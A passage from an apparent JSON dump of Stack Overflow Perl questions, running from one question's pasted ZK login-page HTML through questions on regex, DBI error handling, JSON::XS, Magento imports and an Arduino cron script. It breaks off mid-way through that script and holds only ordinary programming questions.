charset=utf-8\"/&gt;\n\n\n\n\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/WFMeCare/zkau/web/660e7a2d/eCareTheme/zul/css/normie.css.dsp;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\"/&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/WFMeCare/zkau/web/660e7a2d/eCareTheme/wfm/css/wfmie.css.dsp;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\"/&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/WFMeCare/zkau/web/660e7a2d/eCareTheme/zkex/zul/css/zkexie.css.dsp;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\"/&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/WFMeCare/zkau/web/660e7a2d/eCareTheme/zkmax/zul/css/zkmaxie.css.dsp;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\"/&gt;\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/WFMeCare/css/ecare.css;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\"/&gt;\n\n\n&lt;script type=\"text/javascript\" src=\"/WFMeCare/zkau/web/660e7a2d/js/zk/zk.js.dsp;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\" charset=\"UTF-8\"&gt;\n&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"/WFMeCare/zkau/web/660e7a2d/js/zk/lang.js.dsp;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\" charset=\"UTF-8\"&gt;\n&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"/WFMeCare/zkau/web/660e7a2d/js/wfm.js;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\" charset=\"UTF-8\"&gt;\n&lt;/script&gt;\n&lt;script type=\"text/javascript\" src=\"/WFMeCare/zkau/web/660e7a2d/js/clipboard.js;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\" charset=\"UTF-8\"&gt;\n&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;\nzk_ver='3.6.4';\nzk.build='10031815';\nzk_procto=900;\nzk_tipto=800;\nzk_resndto=9000;\nzk_clkflto=0;\nzk.debugJS=true;\nzk.eru={};zk.erusp={};\n\n&lt;/script&gt;\n\n\n\n&lt;link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"/WFMeCare/images/favicon.jpg;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\"/&gt;\n&lt;script type=\"text/javascript\" src=\"/WFMeCare/js/SynchroListbox.js;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\" charset=\"UTF-8\"&gt;\n&lt;/script&gt;\n\n\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;div class=\"zk\" id=\"z_bk_0\" z.dtid=\"gbkl1\" style=\"width:100%;height:100%;\" z.zidsp=\"page\" z.au=\"/WFMeCare/zkau;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\"&gt;\n&lt;div id=\"z_bk_1\"&gt;\n\n\n\n\n\n\n\n\n\n\n&lt;div class=\"zk\" id=\"z_bk_2\" z.dtid=\"gbkl1\" style=\"width:100%;height:100%;\" z.zidsp=\"page\"&gt;\n\n\n\n\n&lt;div id=\"z_bk_3\" z.type=\"zul.wnd2.Wnd2\" z.autoz=\"true\" class=\"z-window-overlapped\" style=\"position:absolute;visibility:hidden;width:420px;\" z.zcls=\"z-window-overlapped\" z.float=\"true\" z.onOK=\"true\" z.onCancel=\"true\" z.pos=\"center\" z.mode=\"overlapped\" z.visible=\"true\" z.minheight=\"100\" z.minwidth=\"200\" z.conshow=\"anima.appear( $e('z_bk_3'));\" z.conhide=\"anima.fade( $e('z_bk_3'),500)\"&gt;&lt;div class=\"z-window-overlapped-tl\"&gt;&lt;div class=\"z-window-overlapped-tr\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=\"z-window-overlapped-hl\"&gt;&lt;div class=\"z-window-overlapped-hr\"&gt;&lt;div class=\"z-window-overlapped-hm\"&gt;&lt;div id=\"z_bk_3!caption\" class=\"z-window-overlapped-header\"&gt;\n\n    &lt;table id=\"z_bk_5\" z.type=\"zul.widget.Capt\" class=\"z-caption\" z.zcls=\"z-caption\" width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;\n&lt;tr valign=\"middle\"&gt;\n&lt;td align=\"left\" class=\"z-caption-l\"&gt;Accesso a WFM eCare! REL:12.7&lt;/td&gt;\n&lt;td align=\"right\" class=\"z-caption-r\" id=\"z_bk_5!cave\"&gt;&lt;/td&gt;\n&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=\"z-window-overlapped-cl\"&gt;&lt;div class=\"z-window-overlapped-cr\"&gt;&lt;div class=\"z-window-overlapped-cm\"&gt;&lt;div id=\"z_bk_3!cave\" class=\" z-window-overlapped-cnt\"&gt;\n    &lt;span id=\"z_bk_4\" z.type=\"zul.timer.Timer\" style=\"display:none;\" z.delay=\"500\" z.repeats=\"false\" z.running=\"false\"&gt;&lt;/span&gt;\n    &lt;table id=\"z_bk_6\" z.type=\"zul.box.Box\" class=\"z-vbox\" z.zcls=\"z-vbox\" z.vert=\"true\" cellpadding=\"0\" cellspacing=\"0\"&gt;\n&lt;tr id=\"z_bk_7!chdextr\" z.coexist=\"true\" valign=\"top\"&gt;\n&lt;td align=\"center\"&gt;&lt;img id=\"z_bk_7\" z.type=\"zul.widget.Img\" align=\"center\" src=\"/WFMeCare/images/logoEcare4login.png;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_7!chdextr2\" class=\"z-vbox-sep\"&gt;&lt;td&gt;&lt;img style=\"width:0;height:0\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_8!chdextr\" z.coexist=\"true\" valign=\"top\"&gt;\n&lt;td align=\"center\"&gt;&lt;div id=\"z_bk_8\" class=\"z-separator-hor\" z.zcls=\"z-separator-hor\"&gt;&amp;nbsp;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_8!chdextr2\" class=\"z-vbox-sep\"&gt;&lt;td&gt;&lt;img style=\"width:0;height:0\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_9!chdextr\" z.coexist=\"true\" valign=\"top\"&gt;\n&lt;td align=\"center\"&gt;&lt;div id=\"z_bk_9\" z.type=\"zul.grid.Grid\" class=\"z-grid\" style=\"width:80%;padding: 3,3,3,3; spacing: 3,3,3,3;\" z.zcls=\"z-grid\" z.scOddRow=\"z-grid-odd\" z.fixed=\"false\"&gt;&lt;div id=\"z_bk_9!head\" class=\"z-grid-header\"&gt;&lt;table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"table-layout:fixed\"&gt;&lt;tbody style=\"visibility:hidden;height:0px\"&gt;&lt;tr id=\"z_bk_a!hdfaker\" class=\"z-grid-faker\"&gt;&lt;th id=\"z_bk_b!hdfaker\" class=\"z-column \" style=\"width:25%;\" z.zcls=\"z-column\"&gt;&lt;div style=\"overflow:hidden\"&gt;&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tr id=\"z_bk_a\" z.type=\"Cols\" class=\"z-columns\" z.zcls=\"z-columns\" z.rid=\"z_bk_9\" z.columnsgroup=\"true\" z.columnshide=\"true\" z.mpop=\"zk_n_a\"align=\"left\"&gt;&lt;th id=\"z_bk_b\" z.type=\"Col\" class=\"z-column \" style=\"width:25%;\" z.zcls=\"z-column\"&gt;&lt;div id=\"z_bk_b!cave\" class=\"z-column-cnt\"&gt;&lt;/div&gt;&lt;/th&gt;\n&lt;/tr&gt;\n&lt;/table&gt;&lt;/div&gt;&lt;div id=\"z_bk_9!body\" class=\"z-grid-body\"&gt;&lt;table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;&lt;tbody style=\"visibility:hidden;height:0px\"&gt;&lt;tr id=\"z_bk_a!bdfaker\" class=\"z-grid-faker\"&gt;&lt;th id=\"z_bk_b!bdfaker\" class=\"z-column \" style=\"width:25%;\" z.zcls=\"z-column\"&gt;&lt;div style=\"overflow:hidden\"&gt;&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody id=\"z_bk_c\" class=\"z-rows\" z.zcls=\"z-rows\"&gt;\n&lt;tr z.type=\"Grw\" id=\"z_bk_d\" class=\"z-row \" z.zcls=\"z-row\" z.rid=\"z_bk_9\" z.visible=\"true\"&gt;&lt;td z.type=\"Gcl\" id=\"z_bk_e!chdextr\" class=\"z-row-inner\"&gt;&lt;div id=\"z_bk_e!cell\" class=\"z-row-cnt\"&gt;&lt;span id=\"z_bk_e\" class=\"z-label\" style=\"font-weight: bolder;\" z.zcls=\"z-label\" class=\"z-label\"&gt;Login&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;\n&lt;td z.type=\"Gcl\" id=\"z_bk_f!chdextr\" class=\"z-row-inner\"&gt;&lt;div id=\"z_bk_f!cell\" class=\"z-row-cnt\"&gt;&lt;input id=\"z_bk_f\" z.type=\"zul.vd.Txbox\" class=\"z-textbox\" style=\"width:98%;font-style: italic; font-weight: bolder;\" z.zcls=\"z-textbox\" z.onOK=\"true\" z.ermg=\"Inserisci un utente valido\" z.srvald=\"both\" type=\"text\"/&gt;&lt;/div&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr z.type=\"Grw\" id=\"z_bk_g\" class=\"z-row z-grid-odd\" z.zcls=\"z-row\" z.rid=\"z_bk_9\" z.visible=\"true\"&gt;&lt;td z.type=\"Gcl\" id=\"z_bk_h!chdextr\" class=\"z-row-inner\"&gt;&lt;div id=\"z_bk_h!cell\" class=\"z-row-cnt\"&gt;&lt;span id=\"z_bk_h\" class=\"z-label\" style=\"font-weight: bolder;\" z.zcls=\"z-label\" class=\"z-label\"&gt;Password&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;\n&lt;td z.type=\"Gcl\" id=\"z_bk_i!chdextr\" class=\"z-row-inner\"&gt;&lt;div id=\"z_bk_i!cell\" class=\"z-row-cnt\"&gt;&lt;input id=\"z_bk_i\" z.type=\"zul.vd.Txbox\" class=\"z-textbox\" style=\"width:98%;font-style: italic; font-weight: bolder;\" z.zcls=\"z-textbox\" z.onOK=\"true\" z.ermg=\"Inserisci una password valida\" z.srvald=\"both\" type=\"password\"/&gt;&lt;/div&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/tbody&gt;\n\n&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_9!chdextr2\" class=\"z-vbox-sep\"&gt;&lt;td&gt;&lt;img style=\"width:0;height:0\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_j!chdextr\" z.coexist=\"true\" valign=\"top\"&gt;\n&lt;td align=\"center\"&gt;&lt;div id=\"z_bk_j\" align=\"center\"&gt;\n    &lt;span z.type=\"zul.btn.Button\" id=\"z_bk_k\" class=\"z-button\"   z.zcls=\"z-button\"&gt;&lt;table id=\"z_bk_k!box\" cellspacing=\"0\" cellpadding=\"0\" border=\"0\" class=\"z-button \" style=\"font-weight: bolder;\"&gt;\n&lt;tr&gt;&lt;td class=\"z-button-tl\"&gt;&lt;/td&gt;&lt;td class=\"z-button-tm\"&gt;&lt;/td&gt;&lt;td class=\"z-button-tr\"&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td class=\"z-button-cl\"&gt;&lt;button id=\"z_bk_k!real\" class=\"z-button\"&gt;&lt;/button&gt;&lt;/td&gt;&lt;td class=\"z-button-cm\"&gt;&lt;img src=\"/WFMeCare/images/btnLogin.png;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\" align=\"absmiddle\" id=\"z_bk_k!hvig\"/&gt; Accedi&lt;/td&gt;\n&lt;td class=\"z-button-cr\"&gt;&lt;div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td class=\"z-button-bl\"&gt;&lt;/td&gt;&lt;td class=\"z-button-bm\"&gt;&lt;/td&gt;&lt;td class=\"z-button-br\"&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_j!chdextr2\" class=\"z-vbox-sep\"&gt;&lt;td&gt;&lt;img style=\"width:0;height:0\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_l!chdextr\" z.coexist=\"true\" valign=\"top\"&gt;\n&lt;td align=\"center\"&gt;&lt;img id=\"z_bk_l\" z.type=\"zul.widget.Img\" align=\"center\" src=\"/WFMeCare/images/logoApplicationWFM.png;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_l!chdextr2\" class=\"z-vbox-sep\"&gt;&lt;td&gt;&lt;img style=\"width:0;height:0\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_m!chdextr\" z.coexist=\"true\" valign=\"top\"&gt;\n&lt;td align=\"center\"&gt;&lt;img id=\"z_bk_m\" z.type=\"zul.widget.Img\" align=\"center\" src=\"/WFMeCare/images/logoApplicationTelecom.png;jsessionid=85C3D62E725D85FA9CE7C42C57B7C2C4.ecare2\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_m!chdextr2\" class=\"z-vbox-sep\"&gt;&lt;td&gt;&lt;img style=\"width:0;height:0\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr id=\"z_bk_n!chdextr\" z.coexist=\"true\" valign=\"top\"&gt;\n&lt;td align=\"center\"&gt;&lt;div id=\"z_bk_n\" style=\"margin-right: 10px;\" align=\"right\"&gt;\n        &lt;span id=\"z_bk_o\" class=\"z-label\" style=\"width:100%;\" z.zcls=\"z-label\" class=\"z-label\"&gt;Build :1503907 del 2012-08-20 16:00&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=\"z-window-overlapped-bl\"&gt;&lt;div class=\"z-window-overlapped-br\"&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;\n&lt;/div&gt;\n\n&lt;noscript&gt;&lt;div class=\"noscript\"&gt;&lt;p&gt;Sorry, JavaScript must be enabled.&lt;br/&gt;Change your browser options, then &lt;a href=\"\"&gt;try again&lt;/a&gt;.&lt;/p&gt;&lt;/div&gt;&lt;/noscript&gt;\n\n\n&lt;script type=\"text/javascript\"&gt;\nzk.addInit(function(){\nzk.process('clientInfo',\"gbkl1\");\nzk.process('focus',\"z_bk_f\");\n});\n&lt;/script&gt;\n\n\n&lt;/div&gt;\n&lt;/div&gt;\n\n\n\n\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":114,"score":0,"question_id":12650487,"title":"Perl Regex to match everything after @ character","body":"<p>I have  a bunch of text files that contain tags referenced by the <code>@</code> symbol. For e.g. a note is tagged 'home' if the note contains <code>@home</code>. </p>\n\n<p>I am trying to find a Perl Regex that will match everything after the <code>@</code> character but not including the @character. </p>\n\n<p>I have this so far <code>(@\\w+)</code> which successfully matches the whole tag (for .e.g it matches <code>@home</code>, <code>@work</code> etc) but I cant find a way to modify it so only the characters after the @ character get picked up. </p>\n\n<p>I had a look at this <a href=\"http://stackoverflow.com/questions/11605271/perl-regex-to-match-all-words-following-a-character\">perl regex to match all words following a character</a> but I couldnt seem to work it out from this. </p>\n\n<p>Any help would be great. </p>\n"},{"tags":["perl","exception-handling","eval","dbi","raiseerror"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12651154,"title":"DBI: raiseerror in eval","body":"<p>This question refers to this comment from Ikegami:</p>\n\n<pre><code>[...] But if you're going to put an eval around every statement, just use RaiseError =&gt; 0. [...]\n</code></pre>\n\n<p>in this <a href=\"http://stackoverflow.com/questions/12635495/should-i-put-the-eval-in-the-subroutine-or-the-subroutine-in-the-eval\">thread</a>.</p>\n\n<p>What do I gain, if I set <code>RaiseError</code> to <code>0</code> in such situations?</p>\n\n<pre><code>#!/usr/bin/env perl\nuse warnings;\nuse 5.10.1;\nuse DBI;\n\nmy $db = 'my_test_sqlite_db.sqlite';\nopen my $fh, '&gt;', $db or die $!;\nclose $fh or die $!;\n\nmy ( $dbh, $sth );\neval {\n    $dbh = DBI-&gt;connect( \"DBI:SQLite:dbname=$db\", \"\", \"\", {} );\n};\nif ( $@ ) { print $@ };\n\nmy $table = 'my_sqlite_table';\n\nsay   \"RaiseError = 1\";\nsay   \"PrintError = 0\";\n$dbh-&gt;{RaiseError} = 1;\n$dbh-&gt;{PrintError} = 0;\neval {\n    $sth = $dbh-&gt;prepare( \"SELECT * FROM $table\" );\n    $sth-&gt;execute();\n};\nif ( $@ ) { print \"ERROR: $@\" };\n\nsay \"\\nRaiseError = 0\";\nsay   \"PrintError = 1\";\n$dbh-&gt;{RaiseError} = 0;\n$dbh-&gt;{PrintError} = 1;\neval {\n    $sth = $dbh-&gt;prepare( \"SELECT * FROM $table\" );\n    $sth-&gt;execute();\n};\nif ( $@ ) { print \"ERROR: $@\" };\n\nsay \"\\nRaiseError = 0\";\nsay   \"PrintError = 0\";\n$dbh-&gt;{RaiseError} = 0;\n$dbh-&gt;{PrintError} = 0;\neval {\n    $sth = $dbh-&gt;prepare( \"SELECT * FROM $table\" );\n    $sth-&gt;execute();\n};\nif ( $@ ) { print \"ERROR: $@\" };\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>RaiseError = 1\nPrintError = 0\nERROR: DBD::SQLite::db prepare failed: no such table: my_sqlite_table at ./perl2.pl line 23.\n\nRaiseError = 0\nPrintError = 1\nDBD::SQLite::db prepare failed: no such table: my_sqlite_table at ./perl2.pl line 33.\nERROR: Can't call method \"execute\" on an undefined value at ./perl2.pl line 34.\n\nRaiseError = 0\nPrintError = 0\nERROR: Can't call method \"execute\" on an undefined value at ./perl2.pl line 44.\n</code></pre>\n"},{"tags":["perl","error-handling","eval"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":12635495,"title":"Should I put the \"eval\" in the subroutine or the subroutine in the \"eval\"?","body":"<p>Does one of these two ways have to be preferred or is it only a matter of taste? </p>\n\n<pre><code>#!/usr/bin/env perl\nuse warnings;\nuse strict;\nuse DBI;\n\nmy $db = 'sqlite_db';\n\n####################   A   ####################\n\nsub get_database_handle {\n    my ( $db ) = @_;\n    my $dbh;\n    eval {\n        $dbh = DBI-&gt;connect( \"DBI:SQLite:$db\", '', '', {...} )\n        or die DBI-&gt;errstr;\n    };\n    if ( $@ ) {\n        print $@;\n        return;\n    }\n    return $dbh;\n}\n\nDATABASES: while ( 1 ) {\n    # choose a database from a list of databases\n    # ...\n    my $dbh = get_database_handle( $db );\n    next DATABASES if not defined $dbh;\n    # ...\n    # do something with the database\n}\n\n####################   B   ####################\n\nsub get_database_handle {\n    my ( $db ) = @_;\n    my $dbh = DBI-&gt;connect( \"DBI:SQLite:$db\", '', '', {...} ) \n    or die DBI-&gt;errstr;\n    return $dbh;\n}\n\nDATABASES: while ( 1 ) {\n    # choose a database from a list of databases\n    # ...\n    my $dbh;\n    eval { $dbh = get_database_handle( $db ); };\n    if ( $@ ) {\n        print $@;\n        next DATABASES;\n    }\n    # ...\n    # do something with the database\n}\n</code></pre>\n"},{"tags":["perl","libnotify"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":12650930,"title":"Perl - Is there a way to display notifications with some textbox?","body":"<p>Here is my problem : I'm trying to make skype more interactive with my gnome desktop environment. So I want to use Perl to do that. Is there a way, using libnotify, to display a textbox (a field I can fill or type in) ?</p>\n"},{"tags":["perl","perltk"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":9663842,"title":"Displaying animated image","body":"<pre><code>use warnings;\nuse Tk;\nuse Tk::Animation;\n\nmy $scr = new MainWindow;\n\n$scr-&gt;configure(-background=&gt;\"black\");\n$scr-&gt;geometry(\"200x100\");\n\nmy $canvas = $scr-&gt;Canvas(-width,200,-height,100,-background=&gt;\"black\")\n                 -&gt;pack(-expand,1,-fill,'both');\n\nmy $image  = $scr-&gt;Animation('-format' =&gt; 'gif', -file=&gt;\"help.gif\" );\n\n$canvas-&gt;createImage( 50,50, -image=&gt; $image);\n$image-&gt;start_animation(500);\n\nMainLoop;\n</code></pre>\n\n<p>I want the image to move up and down in my window.Now what should i add more in this code??</p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":704,"score":-5,"question_id":2548606,"title":"How can I find the first non-repeating character in a string using Perl?","body":"<p>Write a function that returns the first non-repeating character in a string. Example: âThanks for visiting\" returns \"h\".</p>\n"},{"tags":["perl","file","file-handling"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":6,"view_count":208,"score":-5,"question_id":5850028,"title":"Advantages of closing file handle in perl","body":"<p>Advantage of closing file handle in Perl is that \"$.\" gets</p>\n\n<ol>\n<li> reset\n<li> cleans up buffer\n<li> gives command status\n<li> none \n</ol>\n\n<p>Please tell me the correct answer with explanation (if possible) </p>\n"},{"tags":["mysql","perl","query","magento"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12650094,"title":"Magento Unknown table 'REFERENTIAL_CONSTRAINTS' in information_schema","body":"<p>I have trying to debug an issue with our new Magento PIM scripts and in the PIM script logs I have noticed this error:</p>\n\n<blockquote>\n  <p>Unknown table 'REFERENTIAL_CONSTRAINTS' in information_schema</p>\n</blockquote>\n\n<p>Looking in the script that is having issue (mysql-quick-import.pl) it seems to be hanging on this query:</p>\n\n<pre><code>SELECT CONCAT(\"ALTER TABLE \", table_name, \" DROP FOREIGN KEY \", constraint_name, \";\" ) drop_command,\n     CONCAT(\"ALTER TABLE \", table_name, \" ADD CONSTRAINT FOREIGN KEY \", constraint_name, \" (\", column_name, \") \", \" REFERENCES \", REPLACE(referenced_table_name,'_old','') , \" (\", referenced_column_name, \") ON DELETE \", delete_rule, \" ON UPDATE \", update_rule, \";\" ) add_command\n     FROM (SELECT kcu.constraint_name, kcu.table_name, kcu.column_name, kcu.referenced_table_name, kcu.referenced_column_name, rc.update_rule, rc.delete_rule \n         FROM information_schema.KEY_COLUMN_USAGE kcu \n         INNER JOIN information_schema.REFERENTIAL_CONSTRAINTS rc \n         ON kcu.constraint_name = rc.constraint_name \n         WHERE kcu.referenced_table_name = 'atb_colors'\n         AND rc.constraint_schema='web1') stuff;\n</code></pre>\n\n<p>The exact error I'm seeing in the mysql-quick-import.pl Perl script:</p>\n\n<pre><code>Dropping indexes for atb_department_category_old\nDBD::mysql::st execute failed: Unknown table 'REFERENTIAL_CONSTRAINTS' in information_schema at /var/import/util/mysql-quick-import.pl line 197.\nDBD::mysql::st bind_columns failed: Statement has no result columns to bind (perhaps you need to successfully call execute first) at /var/import/util/mysql-quick-import.pl line 198.\nDBD::mysql::st fetch failed: fetch() without execute() at /var/import/util/mysql-quick-import.pl line 199.\n</code></pre>\n\n<p>The main purpose of this script from reviewing the code is that it will quickly import or clone a database. These PIM scripts import our product data and have notice after our initial import all our Magento Product Detail Pages we are seeing this error:</p>\n\n<pre><code>SQLSTATE[23000]: Integrity constraint violation: 1452 Cannot add or update a child row: a foreign key constraint fails (`web1/enterprise_targetrule_index`, CONSTRAINT `enterprise_targetrule_index_ibfk_1` FOREIGN KEY\n</code></pre>\n\n<p>I believe the error that I am seeing in Magento is related to the PIM Perl script that imports our product data. Can someone clarify or simplify what may be happening in the query that is causing issues. Where should I look? How would you proceed in looking to solve this issue? </p>\n\n<p>Any advice greatly appreciate. </p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":54,"score":1,"question_id":12649168,"title":"How can I extract comments and function names from C++ or C or Java with perl","body":"<p>I'm dealing with an assignment, and I'm really new to Perl. Don't understand it really well.\nCould you guys guid me to extract the comments and the function names of these three kind of files (C, C++ and Java)?</p>\n\n<p>I have already tried this:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse File::Basename;\nuse File::Find;\nuse File::Slurp;\nuse Regexp::Common qw /comment/;\n    my $fileName = \"a.java\";\n    my $wordsIn = \"\";\n    my $wordsIdentifier=\"\";\n    my $numRemoved = 0;\n\n    #$wordsOut = `xscc.awk extract=comment prune=copyright $fileName`;\n    $wordsIn = read_file($fileName) ;\n    # Find all matches of comments, and put them into @arr\n    my @arr = $wordsIn =~  m/$RE{comment}{Java}/g;\n    my $wordsOut = join(\" \", @arr);\n    print \"Comments:\\n\";\n    print $wordsOut;\n    $wordsIn =~ s/$RE{comment}{Java}//g;\n    print \"Identifiers:\\n\";\n    print $wordsIn;\n</code></pre>\n\n<p>It perfectly gets the comments(even I don't know how!), but for retrieving the identifiers and methods names what should I do for the $RE{comment}{Java}                               </p>\n\n<p>Regards \nEhsan</p>\n"},{"tags":["json","perl","utf-8"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12631761,"title":"Retrieving original JSON code from a decoded array node in Perl","body":"<p>I'm working on a script which receives JSON code for an array of objects similar to this:</p>\n\n<pre><code>{\n  \"array\":[\n    { \"id\": 1, \"text\": \"Some text\" },\n    { \"id\": 2, \"text\": \"Some text\" }\n  ]\n}\n</code></pre>\n\n<p>I decode it using JSON::XS and then filter out some of the results.  After this, I need to store the JSON code <strong>for each individual node</strong> into a queue for later processing.  The format this queue requires is JSON too, so the code I'd need to insert for each node would be something like this:</p>\n\n<pre><code>{ \"id\": 1, \"text\": \"Some text\" }\n</code></pre>\n\n<p>However, after <strong>decode_json</strong> has decoded a node, all that's left are hash references for each node:</p>\n\n<pre><code>print $json-&gt;{'array'}[0]; # Would print something like HASH(0x7ffa80c83270)\n</code></pre>\n\n<p>I know I could get something similar to the original JSON code using <strong>encode_json</strong> on the hash reference, but the resulting code is different from the original code, UTF-8 characters get all weird, and it seems like a lot of extra processing, specially considering the amount of data this script has to deal with.</p>\n\n<p>Is there a way to retrieve the original JSON code from a decoded array node?  Does JSON::XS keep the original chunks somewhere after they have been decoded?</p>\n\n<hr>\n\n<p><strong>EDIT</strong></p>\n\n<p>About the weird UTF-8 characters, they just look weird on the screen:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse utf8;\nuse JSON::XS;\nbinmode STDOUT, \":utf8\";\n\n$old_json = '{ \"text\": \"Drag\\u00f3n\" }';\n$json = decode_json($old_json);\nprint $json-&gt;{'text'}; # DragÃ³n\n\n$new_json = encode_json($json);\nprint $new_json; # {\"text\":\"DragÃÂ³n\"}\n\n$json = decode_json($new_json);\nprint $json-&gt;{'text'}; # DragÃ³n\n</code></pre>\n"},{"tags":["perl","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12647975,"title":"Set unix group permissions to my files and directories output from my perl script?","body":"<p>My script that i have works just how I want it to, with one exception. I would like to be able to automatically set the unix group permissions to the directory and files that I create in my perl script. </p>\n\n<p>Is this possible, or do i just have to resort to </p>\n\n<pre><code>chgrp &lt;group&gt; &lt;directory&gt;\n</code></pre>\n\n<p>after running my script?</p>\n"}]}
{"total":22324,"page":14,"pagesize":100,"questions":[{"tags":["perl","cron","arduino","command-line-arguments","crontab"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12632571,"title":"Perl cron job stays running","body":"<p>I'm currently using a cron job to have a perl script that tells my arduino to cycle my aquaponics system and all is well, except the perl script doesn't <code>die</code> as intended.</p>\n\n<p>Here is my cron job:</p>\n\n<pre><code>*/15 * * * * /home/dburke/scripts/hal/bin/main.pl cycle\n</code></pre>\n\n<p>And below is my perl script:</p>\n\n<pre><code>#!/usr/bin/perl -w\n# Sample Perl script to transmit number\n# to Arduino then listen for the Arduino\n# to echo it back\n\nuse strict;\nuse Device::SerialPort;\nuse Switch;\nuse Time::HiRes qw ( alarm );\n$|++;\n# Set up the serial port\n# 19200, 81N on the USB ftdi driver\nmy $device = '/dev/arduino0';\n# Tomoc has to use a different tty for testing\n#$device = '/dev/ttyS0';\n\nmy $port = new Device::SerialPort ($device)\n    or die('Unable to open connection to device');;\n$port-&gt;databits(8);\n$port-&gt;baudrate(19200);\n$port-&gt;parity(\"none\");\n$port-&gt;stopbits(1);\n\nmy $lastChoice = ' ';\nmy $signalOut;\nmy $args = shift(@ARGV);\n# Parent must wait for child to exit before exiting itself on CTRL+C\nif ($args eq \"cycle\") {\n                open (LOG, '&gt;&gt;log.txt');\n                print LOG \"Cycle started.\\n\";\n                my $stop = 0;\n                sleep(2);\n                $SIG{ALRM} = sub {\n                        print \"Expecting plant bed to be full; please check.\\n\";\n                        $signalOut = 